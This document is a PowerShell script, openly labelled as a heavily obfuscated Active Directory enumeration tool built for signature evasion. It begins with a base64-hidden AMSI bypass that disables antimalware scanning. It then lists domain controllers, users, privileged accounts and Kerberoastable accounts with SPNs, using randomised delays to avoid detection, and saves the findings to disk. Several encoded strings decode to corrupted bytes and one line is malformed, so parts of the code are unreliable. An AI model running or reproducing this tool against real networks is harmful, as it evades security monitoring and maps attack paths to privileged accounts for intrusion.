<#
.SYNOPSIS
    Obfuscated Domain Enumeration Tool
.NOTES
    Heavily obfuscated for signature evasion
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$qwErTyUiOp,
    
    [Parameter(Mandatory=$false)]
    [switch]$zXcVbNmAsD,
    
    [Parameter(Mandatory=$false)]
    [string]$lKjHgFdSaQ = ".\$(Get-Random)_$([guid]::NewGuid().ToString().Substring(0,8))",
    
    [Parameter(Mandatory=$false)]
    [switch]$pOiUyTrEwQ,
    
    [Parameter(Mandatory=$false)]
    [string[]]$mNbVcXzAsD = @()
)

# Variable obfuscation
$aSdFgHjKlZxC = @{}
$qWeRtYuIoPzX = @()
$zAqWsXcDeRfV = $pOiUyTrEwQ.IsPresent
$tGbHnJmKiLoP = Get-Date -Format ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('eQB5AHkAeQBNAE0ATQBkAGQAXwBIAEgAbQBtAHMAcwA=')))

# AMSI bypass - heavily obfuscated
$aMsiBypaSS = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABhAD0AJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQB1AHQAbwBtAGEAdABpAG8AbgBVAHQAaQBsAHMAJwA7ACQAYgA9ACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAOwAkAGMAPQBbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJABhACkAOwAkAGQAPQAkAGMALgBHAGUAdABGAGkAZQBsAGQAKAAkAGIALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsAJABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA'))
try {
    [ScriptBlock]::Create($aMsiBypaSS).Invoke()
} catch {}

# String encoding function
function gHjKlMnBvCxZ {
    param([string]$s)
    $b = [System.Text.Encoding]::Unicode.GetBytes($s)
    return [Convert]::ToBase64String($b)
}

# String decoding function  
function zXcVbNmQwEr {
    param([string]$e)
    return [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e))
}

# Random delay
function sTaRtSlEeP {
    param([int]$mIn = 500, [int]$mAx = 2000)
    if ($zAqWsXcDeRfV) {
        Start-Sleep -Milliseconds (Get-Random -Minimum $mIn -Maximum $mAx)
    }
}

# Logging function - obfuscated
function wRiTeLoG {
    param([string]$m, [string]$l = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA='))))
    
    $cOlOrS = @{
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA='))) = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBoAGkAdABlAA==')))
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwA='))) = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwByAGUAZQBuAA==')))
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBhAHIAbgBpAG4AZwA='))) = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('WQBlAGwAbABvAHcA')))
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByAA=='))) = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UgBlAGQA')))
    }
    
    $tS = Get-Date -Format ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SABIADoAbQBtADoAcwBzAA==')))
    $lM = "[$tS] [$l] $m"
    
    &(Get-Command *rite-Ho*) $lM -ForegroundColor $cOlOrS[$l]
    
    $lF = Join-Path $lKjHgFdSaQ ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cgBlAGMAbwBuAC4AbABvAGcA')))
    Add-Content -Path $lF -Value $lM -ErrorAction SilentlyContinue
}

# Domain info gathering - obfuscated
function gEtDoMaInInFo {
    wRiTeLoG ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBhAHQAaABlAHIAaQBuAGcAIABkAG8AbQBhAGkAbgAgAGkAbgBmAG8ALgAuAC4A'))) ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA=')))
    
    try {
        $dOmInFo = @{}
        
        $tYpE = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBBAGMAdABpAHYAZQBEAGkAcgBlAGMAdABvAHIAeQAuAEQAbwBtAGEAaQBuAA=='))
        $bYtEs = [System.Text.Encoding]::Unicode.GetBytes($tYpE)
        $tYpEsTr = [System.Text.Encoding]::Unicode.GetString($bYtEs)
        
        $dOmObJ = Invoke-Expression "[$tYpEsTr]::GetCurrentDomain()"
        
        if ($dOmObJ) {
            $dOmInFo[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('TgBhAG0AZQA='))] = $dOmObJ.Name
            $dOmInFo[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))] = $dOmObJ.Forest.Name
            $dOmInFo[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))] = $dOmObJ.DomainControllers | &(Get-Command *elect-Ob*) -ExpandProperty Name
            $dOmInFo[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UABEAEMARVBtAHUAbABhAHQAbwByAA=='))] = $dOmObJ.PdcRoleOwner.Name
            
            wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABvAG0AYQBpAG4AOgAgAA==')))$($dOmInFo[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('TgBhAG0AZQA='))]])" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwA=')))
        }
        
        $aSdFgHjKlZxC[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABvAG0AYQBpAG4ASQBuAGYAbwA='))] = $dOmInFo
        return $dOmInFo
    } catch {
        wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByADoAIAA=')))$_" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByAA==')))
        return $null
    }
}

# DC enumeration - obfuscated
function gEtDoMaInCoNtRoLlErS {
    wRiTeLoG ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAARwBDAHMALgAuAC4A'))) ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA=')))
    
    try {
        $dCzZ = @()
        
        $sEaRcHeR = &(Get-Command *ew-Ob*) System.DirectoryServices.DirectorySearcher
        $sEaRcHeR.Filter = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AYwBvAG0AcAB1AHQAZQByACkAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUAYQAUAAA2AC4AMQAuADQALgA4ADAAMwA6AD0AOAAxADkAMgApACkA'))
        $sEaRcHeR.PropertiesToLoad.AddRange(@([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('bgBhAG0AZQA=')),
                                             [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A')),
                                             [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))))
        
        $rEsUlTs = $sEaRcHeR.FindAll()
        
        foreach ($rEsUlT in $rEsUlTs) {
            $dC = @{
                ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('TgBhAG0AZQA='))) = $rEsUlT.Properties[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('bgBhAG0AZQA='))][0]
                ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SABvAHMAdABOAGEAbQBlAA=='))) = $rEsUlT.Properties[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))][0]
                ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('TwBTAA=='))) = $rEsUlT.Properties[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A'))][0]
            }
            $dCzZ += $dC
            wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBvAHUAbgBkACAARwBDADoAIAA=')))$($dC.Name)" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwA=')))
            
            sTaRtSlEeP -mIn 200 -mAx 500
        }
        
        $aSdFgHjKlZxC[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))] = $dCzZ
        
        if ($dCzZ.Count -gt 0) {
            aDdAtTaCkPaTh -p ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABDACAARQBuAHUAbQBlAHIAYQB0AGkAbwBuAA=='))) -s ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SABpAGcAaAA='))) -d "$($dCzZ.Count) $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABDAHMAIABkAGkAcwBjAG8AdgBlAHIAZQBkAA==')))"
        }
        
        return $dCzZ
    } catch {
        wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByADoAIAA=')))$_" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByAA==')))
        return @()
    }
}

# User enumeration - obfuscated
function gEtDoMaInUsErS {
    wRiTeLoG ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAdQBzAGUAcgBzAC4ALgAuAA=='))) ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA=')))
    
    try {
        $uSeRzZ = @()
        $sEaRcHeR = &(Get-Command *ew-Ob*) System.DirectoryServices.DirectorySearcher
        
        $sEaRcHeR.Filter = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAoACEAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUAYQAUAAA2AC4AMQAuADQALgA4ADAAMwA6AD0AMgApACkAKQA='))
        $sEaRcHeR.PropertiesToLoad.AddRange(@([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')),
                                             [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA=')),
                                             [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA==')),[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $sEaRcHeR.PageSize = 1000
        
        $rEsUlTs = $sEaRcHeR.FindAll()
        
        wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBvAHUAbgBkACAA')))$($rEsUlTs.Count) $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dQBzAGUAcgBzAA==')))" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwA=')))
        
        foreach ($rEsUlT in $rEsUlTs) {
            $uSeR = @{
                ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) = $rEsUlT.Properties[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))][0]
                ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA='))) = if ($rEsUlT.Properties[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))]) { $rEsUlT.Properties[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))][0] } else { 0 }
                ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SABhAHMAUwBQAE4A'))) = $rEsUlT.Properties[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))].Count -gt 0
            }
            
            if ($uSeR.AdminCount -eq 1) {
                wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAZAAgAHUAcwBlAHIAOgAgAA==')))$($uSeR.SamAccountName)" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBhAHIAbgBpAG4AZwA=')))
            }
            
            if ($uSeR.HasSPN) {
                wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SwBlAHIAYgBlAHIAbwBhAHMAdABhAGIAbABlADoAIAA=')))$($uSeR.SamAccountName)" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBhAHIAbgBpAG4AZwA=')))
            }
            
            $uSeRzZ += $uSeR
            
            if ($zAqWsXcDeRfV) {
                sTaRtSlEeP -mIn 100 -mAx 300
            }
        }
        
        $aSdFgHjKlZxC[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQBzAGUAcgBzAA=='))] = $uSeRzZ
        
        $pRiViLeGeD = $uSeRzZ | &(Get-Command *here-Ob*) { $_.AdminCount -eq 1 }
        if ($pRiViLeGeD.Count -gt 0) {
            aDdAtTaCkPaTh -p ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAZAAgAEEAYwBjAG8AdQBuAHQAcwA='))) -s ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QwByAGkAdABpAGMAYQBsAA=='))) -d "$($pRiViLeGeD.Count) $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cAByAGkAdgBpAGwAZQBnAGUAZAAgAGEAYwBjAG8AdQBuAHQAcwA=')))"
        }
        
        $kErbEroAst = $uSeRzZ | &(Get-Command *here-Ob*) { $_.HasSPN }
        if ($kErbEroAst.Count -gt 0) {
            aDdAtTaCkPaTh -p ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SwBlAHIAYgBlAHIAbwBhAHMAdABpAG4AZwA='))) -s ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SABpAGcAaAA='))) -d "$($kErbEroAst.Count) $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dQBzAGUAcgBzACAAdwBpAHQAaAAgAFMAUABOAHMA')))"
        }
        
        return $uSeRzZ
    } catch {
        wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByADoAIAA=')))$_" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByAA==')))
        return @()
    }
}

# Add attack path - obfuscated
function aDdAtTaCkPaTh {
    param([string]$p, [string]$s, [string]$d)
    
    $aTtAcK = @{
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UABhAHQAaAA='))) = $p
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))) = $s
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))) = $d
        ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VABpAG0AZQBzAHQAYQBtAHAA'))) = Get-Date -Format ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('eQB5AHkAeQAtAE0ATQAtAGQAZAAgAEgASAA6AG0AbQA6AHMAcwA=')))
    }
    
    $qWeRtYuIoPzX += $aTtAcK
}

# Export results - obfuscated
function eXpOrTrEsUlTs {
    wRiTeLoG "`n$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQB4AHAAbwByAHQAaQBuAGcAIAByAGUAcwB1AGwAdABzAC4ALgAuAA==')))" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA=')))
    
    try {
        if (-not (Test-Path $lKjHgFdSaQ)) {
            &(Get-Command *ew-It*) -ItemType Directory -Path $lKjHgFdSaQ -Force | &(Get-Command *ut-Nu*)
        }
        
        $jSoNpAtH = Join-Path $lKjHgFdSaQ ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cgBlAHMAdQBsAHQAcwAuAGoAcwBvAG4A')))
        $aSdFgHjKlZxC | &(Get-Command *onvert-To*) -Depth 10 | &(Get-Command *ut-Fi*) -FilePath $jSoNpAtH -Encoding UTF8
        wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwAgAGUAeABwAG8AcgB0AGUAZAA=')))$jSoNpAtH" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwA=')))
        
        if ($aSdFgHjKlZxC[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQBzAGUAcgBzAA=='))]) {
            $uSeRzPaTh = Join-Path $lKjHgFdSaQ ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dQBzAGUAcgBzAC4AYwBzAHYA')))
            $aSdFgHjKlZxC[[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQBzAGUAcgBzAA=='))] | &(Get-Command *xport-C*) -Path $uSeRzPaTh -NoTypeInformation
        }
        
        wRiTeLoG ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQB4AHAAbwByAHQAIABjAG8AbQBwAGwAZQB0AGUAIQA='))) ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwA=')))
        
    } catch {
        wRiTeLoG "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByADoAIAA=')))$_" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RQByAHIAbwByAA==')))
    }
}

# Main execution - obfuscated
function sTaRtReCoN {
    $bAnNeR = @"
    
╔══════════════════════════════════════════════════════════════╗
║                  Domain Assessment Tool                      ║
╚══════════════════════════════════════════════════════════════╝

"@
    &(Get-Command *rite-Ho*) $bAnNeR -ForegroundColor Cyan
    
    wRiTeLoG ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB0AGEAcgB0AGkAbgBnAC4ALgAuAA=='))) ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA=')))
    
    $mOdUlEs = @(
        @{Name=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABvAG0AYQBpAG4ASQBuAGYAbwA=')); Function={gEtDoMaInInFo}},
        @{Name=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgBzAA==')); Function={gEtDoMaInCoNtRoLlErS}},
        @{Name=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RABvAG0AYQBpAG4AVQBzAGUAcgBzAA==')); Function={gEtDoMaInUsErS}}
    )
    
    foreach ($mOdUlE in $mOdUlEs) {
        if ($mNbVcXzAsD -notcontains $mOdUlE.Name) {
            wRiTeLoG "`n--- $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwA6ACAA')))$($mOdUlE.Name) ---" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAGYAbwA=')))
            & $mOdUlE.Function
        }
    }
    
    eXpOrTrEsUlTs
    
    wRiTeLoG "`n=== $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QwBvAG0AcABsAGUAdABlAA=='))) ===" ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwA=')))
}

sTaRtReCoN
